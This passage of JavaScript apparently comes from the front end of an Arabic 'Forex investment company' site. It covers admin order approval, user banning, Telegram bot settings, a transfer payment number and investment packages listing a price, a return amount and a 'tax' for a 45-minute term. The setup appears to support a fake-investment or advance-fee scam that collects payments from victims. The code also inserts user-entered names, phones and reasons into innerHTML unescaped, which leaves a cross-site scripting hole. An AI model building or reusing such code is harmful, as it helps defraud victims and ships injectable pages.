    if (confirm('تسجيل الخروج؟')) {
        localStorage.removeItem(PAGE_KEY);
        showPage('page-landing');
    }
});

// ============================================================
//  ADMIN TABS
// ============================================================
document.querySelectorAll('.admin-tab').forEach(tab => {
    tab.addEventListener('click', function() {
        document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.admin-tab-content').forEach(c => c.classList.remove('active'));
        this.classList.add('active');
        const target = document.getElementById(this.dataset.tab);
        if (target) target.classList.add('active');
        if (this.dataset.tab === 'tab-orders') loadOrders();
        if (this.dataset.tab === 'tab-banned') loadBannedUsers();
    });
});

// ============================================================
//  LOAD ORDERS
// ============================================================
async function loadOrders() {
    const container = document.getElementById('ordersList');
    if (!container) return;
    container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">جاري تحميل الطلبات...</p>';

    const orders = await getOrders();
    if (orders.length === 0) {
        container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">لا توجد طلبات حتى الآن</p>';
        return;
    }

    orders.sort((a, b) => b.timestamp - a.timestamp);

    let html = '';
    orders.forEach((order, index) => {
        const statusClass = order.status === 'pending' ? 'pending' : order.status === 'accepted' ? 'accepted' : 'rejected';
        const statusText = order.status === 'pending' ? 'قيد المراجعة' : order.status === 'accepted' ? 'مقبول' : 'مرفوض';
        const date = new Date(order.timestamp).toLocaleString('ar-EG');

        html += `
            <div class="order-item" data-order-id="${order.orderId || index}">
                <div class="order-header">
                    <div>
                        <strong style="color:#fff;">${order.name}</strong>
                        <span style="color:#8a9bb8; margin-right:10px;">📱 ${order.phone}</span>
                    </div>
                    <div>
                        <span class="order-status ${statusClass}">${statusText}</span>
                        <span style="color:#5e6f8a; font-size:0.8rem; margin-right:8px;">${date}</span>
                    </div>
                </div>
                <div style="color:#b0c4e0; font-size:0.9rem; margin-top:4px;">
                    الباقة: ${order.package} | الضريبة: ${order.tax || 0} جنيه
                </div>
                ${order.reason ? `<div class="order-reason">سبب الرفض: ${order.reason}</div>` : ''}
                ${order.status === 'pending' ? `
                    <div class="order-actions">
                        <button class="btn-sm btn-accept" onclick="acceptOrder('${order.orderId || index}')">
                            <i class="fas fa-check"></i> قبول
                        </button>
                        <button class="btn-sm btn-reject" onclick="rejectOrder('${order.orderId || index}')">
                            <i class="fas fa-times"></i> رفض
                        </button>
                        <button class="btn-sm btn-del" onclick="banUserFromOrder('${order.phone}')">
                            <i class="fas fa-ban"></i> حظر
                        </button>
                    </div>
                ` : ''}
            </div>
        `;
    });
    container.innerHTML = html;

    window.acceptOrder = async function(orderId) {
        if (confirm('تأكيد قبول هذا الطلب؟')) {
            await updateOrderStatus(orderId, 'accepted');
            loadOrders();
        }
    };

    window.rejectOrder = async function(orderId) {
        const reason = prompt('أدخل سبب الرفض (سيظهر للمستخدم):');
        if (reason !== null) {
            await updateOrderStatus(orderId, 'rejected', reason.trim() || 'لم يتم تحديد سبب');
            loadOrders();
        }
    };

    window.banUserFromOrder = async function(phone) {
        if (confirm(`هل تريد حظر المستخدم (${phone}) من الموقع؟`)) {
            await banUser(phone, '');
            const orders = await getOrders();
            const userOrders = orders.filter(o => o.phone === phone && o.status === 'pending');
            for (let o of userOrders) {
                await updateOrderStatus(o.orderId, 'rejected', 'تم حظر المستخدم');
            }
            loadOrders();
            loadBannedUsers();
        }
    };
}

// ============================================================
//  LOAD BANNED USERS
// ============================================================
async function loadBannedUsers() {
    const container = document.getElementById('bannedList');
    if (!container) return;
    container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">جاري تحميل المحظورين...</p>';

    const banned = await getBannedUsers();
    if (banned.length === 0) {
        container.innerHTML = '<p style="color:#5e6f8a; text-align:center; padding:20px;">لا يوجد مستخدمون محظورون</p>';
        return;
    }

    let html = '';
    banned.forEach((user, index) => {
        const date = new Date(user.timestamp).toLocaleString('ar-EG');
        html += `
            <div class="order-item">
                <div>
                    <strong style="color:#fff;">📱 ${user.phone}</strong>
                    <span style="color:#8a9bb8; margin-right:10px;">🌐 ${user.ip || 'غير معروف'}</span>
                    <span style="color:#5e6f8a; font-size:0.8rem; margin-right:8px;">${date}</span>
                </div>
                <button class="btn-sm btn-accept" onclick="unbanUserFromList('${user.phone}')" style="margin-top:6px;">
                    <i class="fas fa-user-check"></i> إلغاء الحظر
                </button>
            </div>
        `;
    });
    container.innerHTML = html;

    window.unbanUserFromList = async function(phone) {
        if (confirm(`إلغاء حظر المستخدم (${phone})؟`)) {
            await unbanUser(phone);
            loadBannedUsers();
        }
    };
}

// ============================================================
//  UNBAN
// ============================================================
document.getElementById('unbanUserBtn')?.addEventListener('click', async function() {
    const phone = document.getElementById('unbanPhone').value.trim();
    if (!phone) {
        showToast('يرجى إدخال رقم الهاتف', 'warning');
        return;
    }
    await unbanUser(phone);
    document.getElementById('unbanPhone').value = '';
    loadBannedUsers();
});

// ============================================================
//  ADMIN SETTINGS
// ============================================================
function loadAdminDashboard() {
    const settings = loadSettings();
    document.getElementById('adminBotToken').value = settings.botToken || DEFAULT_BOT_TOKEN;
    document.getElementById('adminChatId').value = settings.chatId || DEFAULT_CHAT_ID;
    document.getElementById('adminPaymentNumber').value = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
    document.getElementById('paymentNumberDisplay').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
    document.getElementById('taxPaymentNumber').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;

    renderAdminPackages(settings);
    renderUserPackages(settings);
    loadOrders();
    loadBannedUsers();
}

// ============================================================
//  ADMIN BUTTONS
// ============================================================
document.getElementById('saveToFirebaseBtn')?.addEventListener('click', async function() {
    const settings = loadSettings();
    await saveToFirebase(settings);
});

document.getElementById('loadFromFirebaseBtn')?.addEventListener('click', async function() {
    await loadFromFirebase();
    loadOrders();
    loadBannedUsers();
});

document.getElementById('saveBotSettingsBtn')?.addEventListener('click', function() {
    const token = document.getElementById('adminBotToken').value.trim();
    const chatId = document.getElementById('adminChatId').value.trim();
    if (!token || !chatId) {
        showToast('يرجى إدخال التوكن والمعرف', 'warning');
        return;
    }
    const settings = loadSettings();
    settings.botToken = token;
    settings.chatId = chatId;
    saveSettings(settings);
    showToast('تم حفظ إعدادات البوت محلياً');
});

document.getElementById('savePaymentNumberBtn')?.addEventListener('click', function() {
    const num = document.getElementById('adminPaymentNumber').value.trim();
    if (!num) {
        showToast('يرجى إدخال رقم صحيح', 'warning');
        return;
    }
    const settings = loadSettings();
    settings.paymentNumber = num;
    saveSettings(settings);
    showToast('تم تحديث رقم التحويل محلياً');
});

document.getElementById('addPackageBtn')?.addEventListener('click', function() {
    const name = document.getElementById('newPkgName').value.trim();
    const price = parseFloat(document.getElementById('newPkgPrice').value);
    const returnAmt = parseFloat(document.getElementById('newPkgReturn').value);
    const tax = parseFloat(document.getElementById('newPkgTax').value);
    const duration = document.getElementById('newPkgDuration').value.trim() || '45 دقيقة';

    if (!name || isNaN(price) || isNaN(returnAmt) || isNaN(tax)) {
        showToast('يرجى ملء جميع الحقول بشكل صحيح', 'warning');
        return;
    }
    const settings = loadSettings();
    settings.packages.push({ name, price, returnAmount: returnAmt, tax, duration });
    saveSettings(settings);
    document.getElementById('newPkgName').value = '';
    document.getElementById('newPkgPrice').value = '';
    document.getElementById('newPkgReturn').value = '';
    document.getElementById('newPkgTax').value = '';
    document.getElementById('newPkgDuration').value = '';
    showToast('تم إضافة الباقة محلياً');
});

// ============================================================
//  CHECK ORDER STATUS
// ============================================================
document.getElementById('checkOrderStatusBtn')?.addEventListener('click', () => {
    showPage('page-order-status');
});

document.getElementById('backToLandingFromStatus')?.addEventListener('click', () => {
    localStorage.removeItem(PAGE_KEY);
    showPage('page-landing');
});

document.getElementById('checkStatusBtn')?.addEventListener('click', async function() {
    const phone = document.getElementById('statusPhoneInput').value.trim();
    const resultDiv = document.getElementById('orderStatusResult');
    if (!phone) {
        resultDiv.innerHTML = '<p style="color:#f5a342;">يرجى إدخال رقم الهاتف</p>';
        return;
    }

    resultDiv.innerHTML = '<p style="color:#b0c4e0;">جاري البحث...</p>';
    const orders = await getOrderByPhone(phone);
    if (orders.length === 0) {
        resultDiv.innerHTML = '<p style="color:#ff6b6b;">لا توجد طلبات لهذا الرقم</p>';
        return;
    }

    const latest = orders.sort((a, b) => b.timestamp - a.timestamp)[0];
    const statusClass = latest.status === 'pending' ? 'pending' : latest.status === 'accepted' ? 'accepted' : 'rejected';
    const statusText = latest.status === 'pending' ? 'قيد المراجعة' : latest.status === 'accepted' ? 'مقبول ✅' : 'مرفوض ❌';

    let html = `
        <div class="order-item" style="margin-top:12px;">
            <div class="order-header">
                <div>
                    <strong style="color:#fff;">${latest.name}</strong>
                    <span style="color:#8a9bb8; margin-right:10px;">📱 ${latest.phone}</span>
                </div>
                <div>
                    <span class="order-status ${statusClass}">${statusText}</span>
                </div>
            </div>
            <div style="color:#b0c4e0; font-size:0.9rem; margin-top:4px;">
                الباقة: ${latest.package} | الضريبة: ${latest.tax || 0} جنيه
            </div>
            ${latest.reason ? `<div class="order-reason">سبب الرفض: ${latest.reason}</div>` : ''}
            <div style="color:#5e6f8a; font-size:0.8rem; margin-top:6px;">
                تاريخ الطلب: ${new Date(latest.timestamp).toLocaleString('ar-EG')}
            </div>
        </div>
    `;
    resultDiv.innerHTML = html;
});

// ============================================================
//  INIT
// ============================================================
(async function init() {
    const settings = loadSettings();
    document.getElementById('paymentNumberDisplay').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
    document.getElementById('taxPaymentNumber').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
    renderUserPackages(settings);

    try {
        const snapshot = await database.ref('settings').once('value');
        const data = snapshot.val();
        if (data) {
            const current = loadSettings();
            const merged = { ...current, ...data };
            if (merged.packages && Array.isArray(merged.packages)) {
                saveSettings(merged);
                updateCloudStatus(true);
            }
        }
    } catch (e) {
        updateCloudStatus(false);
        console.log('لم يتم التحميل من Firebase');
    }

    const restored = restoreSavedPage();
    if (!restored) {
        showPage('page-landing');
    }

    const now = Date.now();
    if (now < lockUntil) {
        document.getElementById('attemptsLeft').textContent = Math.max(0, 10 - attemptsCount);
    } else {
        attemptsCount = 0;
        localStorage.setItem('admin_attempts', '0');
        document.getElementById('attemptsLeft').textContent = '10';
    }

    console.log('🚀 شركة فوركس للأستثمار - النظام جاهز 100%');
})();
